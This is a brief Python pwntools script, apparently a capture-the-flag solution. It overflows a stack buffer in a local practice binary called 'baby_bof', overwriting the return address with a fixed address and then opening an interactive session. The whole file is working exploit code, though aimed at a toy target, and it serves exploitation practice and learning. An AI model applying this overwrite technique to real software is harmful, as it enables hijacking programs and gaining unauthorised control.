from pwn import *

p = process("./baby_bof")
print p.recvline()

p.sendline("a"*0x28 + "\x4d\x06\x40\x00" + "\x00\x00\x00\x00")

p.interactive()
